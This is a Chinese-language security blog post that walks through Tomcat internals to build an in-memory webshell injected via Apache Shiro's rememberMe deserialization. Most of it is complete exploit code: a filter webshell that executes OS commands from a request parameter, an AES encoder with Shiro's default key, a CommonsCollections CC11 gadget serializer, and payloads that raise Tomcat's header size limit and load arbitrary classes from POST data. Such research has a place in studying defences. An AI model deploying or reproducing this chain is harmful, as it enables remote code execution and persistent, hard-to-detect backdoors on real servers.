# 前言

接上篇[Tomcat反序列化注入回显内存马](https://xz.aliyun.com/t/12494)，在上篇提到师傅们找到了一种Tomcat注入回显内存马的方法，
但他其实有个不足之处：由于shiro中自定义了一个filter，因此无法在shiro中注入内存马。

所以在后边师傅们又找到了一个 **基于全局存储的新思路** ，可以在除tomcat 7以外的其他版本中使用。

# 流程分析

## 寻找response

思路仍然为寻找 tomcat 中哪个类会存储 Request 和 Response

在AbstractProcessor类中发现Request 和 Response，并且是final的，这就意味着一旦赋值后便不会被更改

![](./img/7700721004562302722.png)  
所以下面就了解下如何对这两个属性进行的赋值

### 流程分析

首先在org.apache.coyote.AbstractProtocol#process 中会调用 createProcessor
方法创建Processor，Processo是主要负责请求的预处理

![](./img/3242768396159888818.png)  
由于AbstractHttp11Protocol继承AbstractProtocol，所以会调用的AbstractProtocol的createProcessor()，之后会调用`Http11Processor`的构造方法

![](./img/2132092474464292774.png)  
由于 `Http11Processor` 的父类是 `AbstractProcessor` 所以这里会调用父类的构造函数

![](./img/3164530492802775208.png)  
在构造器中，会初始化 Request 和 Response 然后赋值给 `AbstractProcessor` 的 request 和 response
属性

![](./img/1912323334836706374.png)  
至此我们的 request 和 response 就初始化完毕了，所以现在我们只要获取了 Http11Processor ，那么我们就能获取到我们的
Request 和 Response

## 获取Http11Processor

Http11Processor在通过createProcessor()创建的Processor中，因此下面的目标就是获取Processor

在createProcessor()下面，通过register方法对其进行了注册

![](./img/8575727294770370559.png)  
跟进发现会从 processor 中获取到 RequestInfo类型的请求信息 rp，然后调用 setGlobalProcessor 将我们的 rp
存入子类ConnectionHandler 的 global 属性中

![](./img/3209474957116414227.png)  
所以现在我们获取了 AbstractProtocol$ConnectoinHandler 之后我们就可以利用反射获取到其 global
属性，然后再利用反射获取 gloabl 中的 processors 属性，然后通过遍历 processors 我们可以获取到我们需要的 Request 和
Response

## 获取AbstractProtocol

下面就是寻找存储`AbstractProtocol`类的地方，或者其子类也可以

AbstractProtocol 是 ProtocolHandler
接口的实现类，所以如果能获取ProtocolHandler类也可以，在Connector类中发现了该类型的属性，所以只需要获取Connector类，就可以通过反射获取该属性

![](./img/6084387448416834580.png)  
现在的调用链为：

    
    
    Connector   ->
    AbstractProtocol$ConnectoinHandler ->
    global      ->
    Processor   ->
    Request     ->
    Response
    

## 获取Connector

在 Tomcat
启动的过程中，将会调用`setConnector`方法将connector放在service中去，也即是`StandardService`类对象，所以可从
StandardService 中获取到 Connector

![](./img/7529518660865132108.png)

## 获取WebappClassLoader

可以通过WebappClassLoaderBase 来获取 Tomcat 上下文环境，所以最终的调用链为

    
    
    WebappClassLoader ->
    StandardService  ->
    Connector   ->
    AbstractProtocol$ConnectoinHandler ->
    global      ->
    Processor   ->
    Request     ->
    Response
    

POC：

    
    
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    import org.apache.catalina.core.StandardContext;
    
    import javax.servlet.*;
    import javax.servlet.http.HttpServletRequest;
    import java.io.IOException;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    import java.util.Map;
    
    public class TomcatMemShellInject extends AbstractTranslet implements Filter{
    
        private final String cmdParamName = "cmd";
        private final static String filterUrlPattern = "/*";
        private final static String filterName = "evilFilter";
    
        static {
            try {
    
                Class c = Class.forName("org.apache.catalina.core.StandardContext");
    
                org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
                        (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
                StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
    
                ServletContext servletContext = standardContext.getServletContext();
    
                Field Configs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
                Configs.setAccessible(true);
                Map filterConfigs = (Map) Configs.get(standardContext);
                if (filterConfigs.get(filterName) == null){
                    java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class
                            .getDeclaredField("state");
                    stateField.setAccessible(true);
                    stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
                    Filter MemShell = new TomcatMemShellInject();
    
                    javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext
                            .addFilter(filterName, MemShell);
                    filterRegistration.setInitParameter("encoding", "utf-8");
                    filterRegistration.setAsyncSupported(false);
                    filterRegistration
                            .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,
                                    new String[]{filterUrlPattern});
    
                    if (stateField != null) {
                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
                    }
    
                    if (standardContext != null){
                        Method filterStartMethod = org.apache.catalina.core.StandardContext.class
                                .getMethod("filterStart");
                        filterStartMethod.setAccessible(true);
                        filterStartMethod.invoke(standardContext, null);
    
                        Class ccc = null;
                        try {
                            ccc = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                        } catch (Throwable t){}
                        if (ccc == null) {
                            try {
                                ccc = Class.forName("org.apache.catalina.deploy.FilterMap");
                            } catch (Throwable t){}
                        }
    
    
                        Method m = c.getMethod("findFilterMaps");
                        Object[] filterMaps = (Object[]) m.invoke(standardContext);
                        Object[] tmpFilterMaps = new Object[filterMaps.length];
                        int index = 1;
                        for (int i = 0; i < filterMaps.length; i++) {
                            Object o = filterMaps[i];
                            m = ccc.getMethod("getFilterName");
                            String name = (String) m.invoke(o);
                            if (name.equalsIgnoreCase(filterName)) {
                                tmpFilterMaps[0] = o;
                            } else {
                                tmpFilterMaps[index++] = filterMaps[i];
                            }
                        }
                        for (int i = 0; i < filterMaps.length; i++) {
                            filterMaps[i] = tmpFilterMaps[i];
                        }
    
                    }
                }
    
            } catch (Exception e){
                e.printStackTrace();
            }
        }
    
    
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    
        }
    
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    
        }
    
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
    
        }
    
        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            System.out.println("Do Filter ......");
            String cmd;
            if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
                return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }
    
        @Override
        public void destroy() {
    
        }
    }
    

aes加密

    
    
    import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
    import org.apache.catalina.startup.Tomcat;
    import org.apache.shiro.crypto.AesCipherService;
    import org.apache.shiro.util.ByteSource;
    import java.io.*;
    
    import org.apache.coyote.http11.Http11Processor;
    
    public class AESEncode {
    
        public static void main(String[] args) throws Exception {
    
            String tomcatHeader = "./tomcatHeader.ser";
            String tomcatInject = "./tomcatInject.ser";
            String tomcatEcho = "./TomcatEcho.ser";
    
    
            byte[] key = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
            AesCipherService aes = new AesCipherService();
            ByteSource ciphertext = aes.encrypt(getBytes(tomcatHeader), key);
            System.out.printf(ciphertext.toString());
        }
    
    
        public static byte[] getBytes(String path) throws Exception{
            InputStream inputStream = new FileInputStream(path);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            int n = 0;
            while ((n=inputStream.read())!=-1){
                byteArrayOutputStream.write(n);
            }
            byte[] bytes = byteArrayOutputStream.toByteArray();
            return bytes;
    
        }
    }
    

CC11

    
    
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    
    import java.io.*;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.HashSet;
    
    @SuppressWarnings("all")
    public class CC11Template {
    
        public static void main(String[] args) throws Exception {
    
    
            // 写入.class 文件
            // 将我的恶意类转成字节码，并且反射设置 bytecodes
            byte[] classBytes = getBytes();
            byte[][] targetByteCodes = new byte[][]{classBytes};
            TemplatesImpl templates = TemplatesImpl.class.newInstance();
    
            Field f0 = templates.getClass().getDeclaredField("_bytecodes");
            f0.setAccessible(true);
            f0.set(templates,targetByteCodes);
    
            f0 = templates.getClass().getDeclaredField("_name");
            f0.setAccessible(true);
            f0.set(templates,"name");
    
            f0 = templates.getClass().getDeclaredField("_class");
            f0.setAccessible(true);
            f0.set(templates,null);
    
            // 利用反射调用 templates 中的 newTransformer 方法
            InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
            HashMap innermap = new HashMap();
            LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
            TiedMapEntry tiedmap = new TiedMapEntry(map,templates);
            HashSet hashset = new HashSet(1);
            hashset.add("foo");
            // 我们要设置 HashSet 的 map 为我们的 HashMap
            Field f = null;
            try {
                f = HashSet.class.getDeclaredField("map");
            } catch (NoSuchFieldException e) {
                f = HashSet.class.getDeclaredField("backingMap");
            }
            f.setAccessible(true);
            HashMap hashset_map = (HashMap) f.get(hashset);
    
            Field f2 = null;
            try {
                f2 = HashMap.class.getDeclaredField("table");
            } catch (NoSuchFieldException e) {
                f2 = HashMap.class.getDeclaredField("elementData");
            }
    
            f2.setAccessible(true);
            Object[] array = (Object[])f2.get(hashset_map);
    
            Object node = array[0];
            if(node == null){
                node = array[1];
            }
            Field keyField = null;
            try{
                keyField = node.getClass().getDeclaredField("key");
            }catch(Exception e){
                keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
            }
            keyField.setAccessible(true);
            keyField.set(node,tiedmap);
    
            // 在 invoke 之后，
            Field f3 = transformer.getClass().getDeclaredField("iMethodName");
            f3.setAccessible(true);
            f3.set(transformer,"newTransformer");
    
            try{
    
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./tomcatHeader.ser"));
    //            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./tomcatInject.ser"));
                outputStream.writeObject(hashset);
                outputStream.close();
    
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    
    
        public static byte[] getBytes() throws IOException {
            InputStream inputStream = new FileInputStream(new File("./src/test/java/TomcatHeaderSize.class"));
    //        InputStream inputStream = new FileInputStream(new File("./src/test/java/TomcatMemShellInject.class"));
    
    
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            int n = 0;
            while ((n=inputStream.read())!=-1){
                byteArrayOutputStream.write(n);
            }
            byte[] bytes = byteArrayOutputStream.toByteArray();
            System.out.println(bytes);
            return bytes;
        }
    }
    

# Header 长度限制绕过

通过CC11将POC的class文件进行序列化后，将序列化文件进行aes加密，传入rememberMe字段，之后会报错Header求情头过大：

![](./img/2038911812296801579.png)

## 1、反射修改maxHeaderSize

POC：

    
    
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    
    @SuppressWarnings("all")
    public class TomcatHeaderSize extends AbstractTranslet {
    
        static {
            try {
                java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
                java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
                java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
                java.lang.reflect.Field headerSizeField = org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField("headerBufferSize");
                java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);
                contextField.setAccessible(true);
                headerSizeField.setAccessible(true);
                serviceField.setAccessible(true);
                requestField.setAccessible(true);
                getHandlerMethod.setAccessible(true);
                org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
                        (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
                org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());
                org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);
                org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();
                for (int i = 0; i < connectors.length; i++) {
                    if (4 == connectors[i].getScheme().length()) {
                        org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
                        if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {
                            Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();
                            for (int j = 0; j < classes.length; j++) {
                            // org.apache.coyote.AbstractProtocol$ConnectionHandler
                                if (52 == (classes[j].getName().length()) || 60 == (classes[j].getName().length())) {
                                    java.lang.reflect.Field globalField = classes[j].getDeclaredField("global");
                                    java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
                                    globalField.setAccessible(true);
                                    processorsField.setAccessible(true);
                                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, null));
                                    java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
                                    for (int k = 0; k < list.size(); k++) {
                                        org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));
                                      // 10000 为修改后的 headersize 
                                        headerSizeField.set(tempRequest.getInputBuffer(),10000);
                                    }
                                }
                            }
                             // 10000 为修改后的 headersize 
                            ((org.apache.coyote.http11.AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(10000);
                        }
                    }
                }
            } catch (Exception e) {
            }
        }
    
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    
        }
    
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    
        }
    }
    

同样将文件进行序列化后，进行aes加密传入rememberMe

![](./img/5144530173944791310.png)  
之后再将内存马注入

![](./img/440879382256831552.png)  
成功执行命令

![](./img/6702190563257119095.png)

## 2、自定义ClassLoader加载Body数据

remember中只传入自定义的ClassLoader来获取传入的POST数据

POC：

    
    
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    
    
    
    public class MyLoader extends AbstractTranslet {
    
        static {
            try {
                String pass = "loader";
                System.out.println("Loader load.....");
                org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
                        (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    
                org.apache.catalina.Context context = webappClassLoaderBase.getResources().getContext();
                java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
                contextField.setAccessible(true);
                org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(context);
    
                java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
                serviceField.setAccessible(true);
                org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);
    
                org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();
    
                for (int i = 0; i < connectors.length; i++) {
                    if (connectors[i].getScheme().contains("http")) {
                        org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
                        java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler", null);
                        getHandlerMethod.setAccessible(true);
                        org.apache.tomcat.util.net.AbstractEndpoint.Handler connectoinHandler = (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler, null);
    
                        java.lang.reflect.Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
                        globalField.setAccessible(true);
                        org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(connectoinHandler);
    
                        java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
                        processorsField.setAccessible(true);
                        java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
    
                        //通过QueryString筛选
                        for (int k = 0; k < list.size(); k++) {
                            org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) list.get(k);
                            if (requestInfo.getCurrentUri().contains("demo")){
                                System.out.println("success");
                                java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
                                requestField.setAccessible(true);
                                org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo);
                                org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
    
                                org.apache.catalina.connector.Response response = request.getResponse();
                                javax.servlet.http.HttpSession session = request.getSession();
                                String classData = request.getParameter("classData");
                                System.out.println(classData);
                                byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(classData);
                                java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
                                defineClassMethod.setAccessible(true);
                                Class cc = (Class) defineClassMethod.invoke(MyLoader.class.getClassLoader(), classBytes, 0, classBytes.length);
                                Class.forName(cc.getName());
                                break;
                            }
    
                        }
                    }
                }
    
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    
        }
    
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    
        }
    }
    

请求时url必须加上demo才回加载

